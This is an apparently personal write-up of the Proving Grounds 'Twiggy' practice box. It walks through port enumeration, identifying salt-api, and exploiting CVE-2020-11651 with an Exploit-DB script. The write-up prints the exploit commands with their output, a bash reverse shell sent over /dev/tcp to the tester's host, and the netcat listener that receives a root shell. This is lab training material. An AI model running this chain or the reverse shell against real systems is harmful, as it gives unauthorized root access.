---
title: Proving Grounds - Twiggy
date: 2022-11-16
author: Marius
tags: [ctf, 'proving grounds', 'pg']
---

Easy box found in Proving Grounds practice.

### Enumeration

Checked openports with rustscan before doing an nmap scan to save few precious minutes.

```
└─$ nmap -sV -sC 192.168.209.62 -p 22,53,80,4506,4505,8000
Starting Nmap 7.93 ( https://nmap.org ) at 2022-11-16 14:21 EST
Nmap scan report for 192.168.209.62
Host is up (0.088s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
53/tcp   open  domain  NLnet Labs NSD
80/tcp   open  http    nginx 1.16.1
|_http-title: Home | Mezzanine
|_http-server-header: nginx/1.16.1
4505/tcp open  zmtp    ZeroMQ ZMTP 2.0
4506/tcp open  zmtp    ZeroMQ ZMTP 2.0
8000/tcp open  http    nginx 1.16.1
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: nginx/1.16.1
|_http-title: Site doesn't have a title (application/json).
```

### Port 80

Did some enumeration on the site, directory brute-forcing, attempted SQLi on on the open fields and default admin credentials to admin page without any luck. Moving on for now.

![alt text](/assets/img/twiggy/1.png)

### Port 8000

Looks like some sort of API.

![alt text](/assets/img/twiggy/2.png)

Reviwing headers reveals this is salt-api.

```
└─$ curl -X HEAD -i 192.168.209.62:8000
Warning: Setting custom HTTP method to HEAD with -X/--request may not work the 
Warning: way you want. Consider using -I/--head instead.
HTTP/1.1 200 OK
Server: nginx/1.16.1
Date: Wed, 16 Nov 2022 19:46:27 GMT
Content-Type: application/json
Content-Length: 146
Connection: keep-alive
Access-Control-Expose-Headers: GET, POST
Vary: Accept-Encoding
Allow: GET, HEAD, POST
Access-Control-Allow-Credentials: true
Access-Control-Allow-Origin: *
X-Upstream: salt-api/3000-1
```

### Exploitation

Googling *salt-api exploit*, I got a lot of results for Saltstack. So I checked searchsploit for any known exploits.

```
└─$ searchsploit saltstack
--------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                 |  Path
--------------------------------------------------------------------------------------------------------------- ---------------------------------
Saltstack 3000.1 - Remote Code Execution                                                                       | multiple/remote/48421.txt
--------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

Got a copy of this exploit which was a python script. So I used that to exploit the target. I had to install "salt" package with PIP  to use it though.

```
└─$ searchsploit -m 48421
└─$ mv 48421.txt poc.py
```

Looks like this worked.
```
└─$ python poc.py --master 192.168.209.62    
[!] Please only use this script to verify you have correctly patched systems you have permission to access. Hit ^C to abort.
[+] Checking salt-master (192.168.209.62:4506) status... ONLINE
[+] Checking if vulnerable to CVE-2020-11651... YES
[*] root key obtained: vMgqnGMHH96nB/hq+jAZQI4qE/tLPYl76AiA0YG/rQvnm0NQqiGm9TKPpdBR9/BkQBg2T1CmQHk=
```

After reviewing this code I saw it takes --exec flag to execute a command, so I inserted a reverse shell.

```
└─$ python poc.py --exec 'bash -i >& /dev/tcp/192.168.49.209/80 0>&1' --master 192.168.209.62
[!] Please only use this script to verify you have correctly patched systems you have permission to access. Hit ^C to abort.
[+] Checking salt-master (192.168.209.62:4506) status... ONLINE
[+] Checking if vulnerable to CVE-2020-11651... YES
[*] root key obtained: vMgqnGMHH96nB/hq+jAZQI4qE/tLPYl76AiA0YG/rQvnm0NQqiGm9TKPpdBR9/BkQBg2T1CmQHk=
[+] Attemping to execute bash -i >& /dev/tcp/192.168.49.209/80 0>&1 on 192.168.209.62
[+] Successfully scheduled job: 20221116194428136157
```

Looks like I got root shell.

```
└─$ nc -nvlp 80
listening on [any] 80 ...
connect to [192.168.49.209] from (UNKNOWN) [192.168.209.62] 38154
bash: no job control in this shell
[root@twiggy root]# whoami
whoami
root
```

And thats all. GG